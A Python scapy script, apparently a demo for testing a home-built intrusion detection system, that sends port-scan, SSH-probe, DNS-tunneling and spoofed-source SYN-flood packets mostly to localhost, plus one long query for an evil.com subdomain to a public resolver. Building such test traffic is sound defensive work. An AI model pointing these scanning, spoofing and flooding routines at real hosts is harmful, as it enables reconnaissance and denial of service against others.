import sys
sys.path.insert(0, "..")

from scapy.all import IP, TCP, UDP, DNS, DNSQR, send, Raw
import time

TARGET = "127.0.0.1"


def simulate_port_scan():
    print("[*] Giả lập PORT SCAN - quét 30 port...")
    for port in range(1, 31):
        send(IP(dst=TARGET) / TCP(dport=port, flags="S"), verbose=False)
    print("[+] Đã gửi 30 SYN packets đến 30 port khác nhau\n")


def simulate_brute_force():
    print("[*] Giả lập BRUTE FORCE SSH - 20 lần kết nối port 22...")
    for i in range(20):
        send(IP(dst=TARGET) / TCP(dport=22, sport=40000 + i, flags="S"), verbose=False)
    print("[+] Đã gửi 20 SYN packets đến port 22\n")


def simulate_dns_tunneling():
    print("[*] Giả lập DNS TUNNELING - domain dài bất thường...")
    long_domain = "a" * 60 + ".evil.com"
    send(IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=long_domain)), verbose=False)
    print(f"[+] Đã gửi DNS query: {long_domain[:40]}...\n")


def simulate_syn_flood():
    print("[*] Giả lập SYN FLOOD - 150 gói SYN từ nhiều IP giả...")
    for i in range(150):
        fake_ip = f"10.{i % 256}.{(i // 256) % 256}.{i % 200 + 1}"
        send(IP(src=fake_ip, dst=TARGET) / TCP(dport=80, flags="S"), verbose=False)
    print("[+] Đã gửi 150 SYN packets từ nhiều IP giả\n")


if __name__ == "__main__":
    print("=" * 50)
    print("  DEMO TẤN CÔNG - Chạy IDS ở terminal khác trước!")
    print("  sudo python3 main.py lo")
    print("=" * 50)

    input("\nNhấn Enter để bắt đầu port scan...")
    simulate_port_scan()
    time.sleep(2)

    input("Nhấn Enter để bắt đầu brute force SSH...")
    simulate_brute_force()
    time.sleep(2)

    input("Nhấn Enter để bắt đầu DNS tunneling...")
    simulate_dns_tunneling()
    time.sleep(2)

    input("Nhấn Enter để bắt đầu SYN flood...")
    simulate_syn_flood()

    print("\n[✓] Demo hoàn tất! Kiểm tra IDS ở terminal kia.")
